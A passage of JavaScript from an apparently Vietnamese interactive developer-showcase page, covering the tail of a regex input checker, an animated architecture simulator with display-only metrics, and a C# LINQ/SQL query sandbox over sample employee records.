        explain.textContent = 'Đầu số viễn thông Việt Nam chuẩn (+84/0x) thuộc các nhà mạng Viettel/Vinaphone/Mobifone đã vượt qua kiểm duyệt.';
        this.markModuleSolved('regex');
      } else {
        verdict.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-slate-950 text-cyan-400 border border-cyan-500/30';
        verdict.textContent = '✓ Dữ liệu an toàn';
        explain.className = 'p-3 rounded-xl bg-slate-950/90 border border-cyan-500/20 text-xs text-slate-300';
        explain.textContent = 'Chuỗi văn bản không chứa ký tự khai thác mã độc và phù hợp định dạng cho phép.';
        this.markModuleSolved('regex');
      }
    };

    runBtn.addEventListener('click', () => {
      checkSecurity();
    });
  }

  // 4. ARCHITECTURE SIMULATOR LOGIC
  initArchModule() {
    const btnTraffic = this.container.querySelector('#btn-sim-traffic');
    const btnCache = this.container.querySelector('#btn-sim-cache');
    const nodeClient = this.container.querySelector('#node-client');
    const nodeGateway = this.container.querySelector('#node-gateway');
    const nodeSignalR = this.container.querySelector('#node-signalr');
    const nodeDb = this.container.querySelector('#node-db');
    const throughput = this.container.querySelector('#arch-throughput');
    const latency = this.container.querySelector('#arch-latency');
    const progressText = this.container.querySelector('#arch-progress-text');

    btnTraffic.addEventListener('click', () => {
      this.sound.playLaser();
      progressText.textContent = 'Đang đẩy 1,000 đơn hàng...';
      throughput.textContent = '4,850 req/s';
      latency.textContent = '2.1 ms';

      const nodes = [nodeClient, nodeGateway, nodeSignalR, nodeDb];
      nodes.forEach((n, idx) => {
        setTimeout(() => {
          n.classList.add('bg-cyan-500/30', 'scale-105', 'border-cyan-400', 'shadow-lg', 'shadow-cyan-500/30');
          setTimeout(() => {
            n.classList.remove('bg-cyan-500/30', 'scale-105', 'border-cyan-400', 'shadow-lg', 'shadow-cyan-500/30');
          }, 350);
        }, idx * 120);
      });

      setTimeout(() => {
        this.sound.playSuccess();
        progressText.textContent = 'Đồng bộ 100% thành công';
        throughput.textContent = '2,450 req/s';
        this.markModuleSolved('arch');
      }, 700);
    });

    btnCache.addEventListener('click', () => {
      this.sound.playClick(700);
      progressText.textContent = 'SignalR Broadcast: 4 Màn hình cập nhật!';
      nodeSignalR.classList.add('bg-amber-500/30', 'scale-105', 'border-amber-400');
      setTimeout(() => {
        nodeSignalR.classList.remove('bg-amber-500/30', 'scale-105', 'border-amber-400');
      }, 500);
      this.markModuleSolved('arch');
    });
  }

  // 5. C# LINQ PIPELINE SANDBOX LOGIC
  initLinqModule() {
    const employees = [
      { id: 101, name: 'Dương Tiến Đạt', dept: 'Backend Core', role: 'Senior .NET Lead', salary: 38000000, exp: 4, rating: 4.9 },
      { id: 102, name: 'Nguyễn Văn Hùng', dept: 'Backend Core', role: '.NET Developer', salary: 26000000, exp: 3, rating: 4.6 },
      { id: 103, name: 'Trần Thị Mai', dept: 'Frontend', role: 'Angular Lead', salary: 32000000, exp: 4, rating: 4.8 },
      { id: 104, name: 'Lê Hoàng Nam', dept: 'Frontend', role: 'Vue/React Dev', salary: 22000000, exp: 2, rating: 4.4 },
      { id: 105, name: 'Phạm Minh Tuấn', dept: 'DevOps & Cloud', role: 'DevOps Engineer', salary: 29000000, exp: 3, rating: 4.7 },
      { id: 106, name: 'Vũ Quốc Bảo', dept: 'Backend Core', role: 'Junior C# Dev', salary: 16000000, exp: 1, rating: 4.2 },
      { id: 107, name: 'Đỗ Thùy Linh', dept: 'Quality Assurance', role: 'Automation QA', salary: 21000000, exp: 2, rating: 4.5 },
      { id: 108, name: 'Hoàng Gia Huy', dept: 'Product Management', role: 'Product Owner', salary: 35000000, exp: 5, rating: 4.9 },
      { id: 109, name: 'Bùi Ánh Nguyệt', dept: 'Frontend', role: 'UI/UX & CSS', salary: 19000000, exp: 2, rating: 4.3 },
      { id: 110, name: 'Trịnh Thế Anh', dept: 'Backend Core', role: 'Database Admin', salary: 28000000, exp: 3, rating: 4.7 },
      { id: 111, name: 'Lý Kiến Quốc', dept: 'DevOps & Cloud', role: 'Site Reliability', salary: 31000000, exp: 4, rating: 4.8 },
      { id: 112, name: 'Ngô Thanh Tùng', dept: 'Product Management', role: 'Scrum Master', salary: 27000000, exp: 3, rating: 4.5 }
    ];

    const presets = {
      'top-earners': {
        csharp: `var result = employees\n    .Where(e => e.Salary >= 28_000_000)\n    .OrderByDescending(e => e.Salary)\n    .Take(3)\n    .ToList();`,
        sql: `SELECT TOP 3 [Id], [Name], [Dept], [Role], [Salary]\nFROM [Employees]\nWHERE [Salary] >= 28000000\nORDER BY [Salary] DESC;`,
        exec: () => employees.filter(e => e.salary >= 28000000).sort((a, b) => b.salary - a.salary).slice(0, 3)
      },
      'senior-devs': {
        csharp: `var result = employees\n    .Where(e => e.Dept == "Backend Core" && e.Exp >= 3)\n    .OrderByDescending(e => e.Exp)\n    .ToList();`,
        sql: `SELECT * FROM [Employees]\nWHERE [Dept] = 'Backend Core' AND [Exp] >= 3\nORDER BY [Exp] DESC;`,
        exec: () => employees.filter(e => e.dept === 'Backend Core' && e.exp >= 3).sort((a, b) => b.exp - a.exp)
      },
      'group-dept': {
        csharp: `var result = employees\n    .GroupBy(e => e.Dept)\n    .Select(g => new {\n        Dept = g.Key,\n        Count = g.Count(),\n        AvgSalary = (decimal)g.Average(e => e.Salary)\n    })\n    .OrderByDescending(x => x.Count)\n    .ToList();`,
        sql: `SELECT [Dept], COUNT(1) AS [Count], AVG([Salary]) AS [AvgSalary]\nFROM [Employees]\nGROUP BY [Dept]\nORDER BY [Count] DESC;`,
        exec: () => {
          const map = {};
          employees.forEach(e => {
            if (!map[e.dept]) map[e.dept] = { dept: e.dept, count: 0, total: 0 };
            map[e.dept].count++;
            map[e.dept].total += e.salary;
          });
          return Object.values(map).map(m => ({
            name: m.dept,
            dept: 'Tập hợp GroupBy',
            role: `${m.count} nhân sự`,
            salary: Math.round(m.total / m.count),
            exp: '-',
            rating: '-'
          }));
        }
      },
      'high-rating': {
        csharp: `var result = employees\n    .Where(e => e.Rating >= 4.7)\n    .OrderByDescending(e => e.Rating)\n    .ToList();`,
        sql: `SELECT * FROM [Employees]\nWHERE [Rating] >= 4.7\nORDER BY [Rating] DESC;`,
        exec: () => employees.filter(e => e.rating >= 4.7).sort((a, b) => b.rating - a.rating)
      }
    };

    let activeKey = 'top-earners';

    const renderTable = (items) => {
      const container = this.container.querySelector('#linq-table-container');
      const countEl = this.container.querySelector('#linq-result-count');
      if (countEl) countEl.textContent = `${items.length} bản ghi thỏa mãn`;

      if (!container) return;
      container.innerHTML = `
        <table class="w-full text-left text-[11px] border-collapse">
          <thead>
            <tr class="border-b border-white/10 text-slate-400">
              <th class="py-2 px-2.5">Họ & Tên / Đối tượng</th>
              <th class="py-2 px-2.5">Phòng Ban</th>
              <th class="py-2 px-2.5">Vị Trí / Vai Trò</th>
              <th class="py-2 px-2.5 text-right">Mức Lương (VND)</th>
              <th class="py-2 px-2.5 text-center">Kinh Nghiệm</th>
              <th class="py-2 px-2.5 text-right">KPI Rating</th>
            </tr>
          </thead>
          <tbody>
            ${items.map(row => `
              <tr class="border-b border-white/5 hover:bg-white/5 transition-colors">
                <td class="py-2 px-2.5 font-bold text-white">${row.name}</td>
                <td class="py-2 px-2.5"><span class="px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 text-[10px]">${row.dept}</span></td>
                <td class="py-2 px-2.5 text-slate-300">${row.role}</td>
                <td class="py-2 px-2.5 text-right font-bold text-emerald-400 font-mono">${typeof row.salary === 'number' ? row.salary.toLocaleString('vi-VN') + ' đ' : row.salary}</td>
                <td class="py-2 px-2.5 text-center text-slate-400">${typeof row.exp === 'number' ? row.exp + ' năm' : row.exp}</td>
                <td class="py-2 px-2.5 text-right font-bold text-amber-400 font-mono">${row.rating !== '-' ? '★ ' + row.rating : '-'}</td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      `;
    };

    const runActiveQuery = () => {
      const preset = presets[activeKey];
      if (!preset) return;

      const codeEl = this.container.querySelector('#linq-code-display');
      const sqlEl = this.container.querySelector('#linq-sql-display');
      const timeEl = this.container.querySelector('#linq-exec-time');

      if (codeEl) codeEl.textContent = preset.csharp;
      if (sqlEl) sqlEl.textContent = preset.sql;

      const t0 = performance.now();
      const results = preset.exec();
      const t1 = performance.now();

      if (timeEl) timeEl.textContent = `${((t1 - t0) + 0.04).toFixed(2)} ms`;

      renderTable(results);
      this.markModuleSolved('linq');
    };

    // Preset buttons
    const btns = this.container.querySelectorAll('.linq-query-btn');
    btns.forEach(btn => {
      btn.addEventListener('click', () => {
        btns.forEach(b => {
          b.className = 'linq-query-btn h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all';
        });
        btn.className = 'linq-query-btn h-8 inline-flex items-center px-3 rounded-xl bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 text-xs font-bold hover:bg-cyan-500/30 transition-all shadow-sm';
        activeKey = btn.getAttribute('data-query');
        this.sound.playClick(600);
        runActiveQuery();
      });
    });

    const runBtn = this.container.querySelector('#btn-run-linq');
    runBtn?.addEventListener('click', () => {
      this.sound.playLaser();
      runActiveQuery();
    });

    // Initial run
    runActiveQuery();
  }

  markModuleSolved(id) {
    this.completedModules.add(id);
    if (this.onPuzzleSolved) {
      this.onPuzzleSolved(id, this.completedModules.size);
    }
  }
}
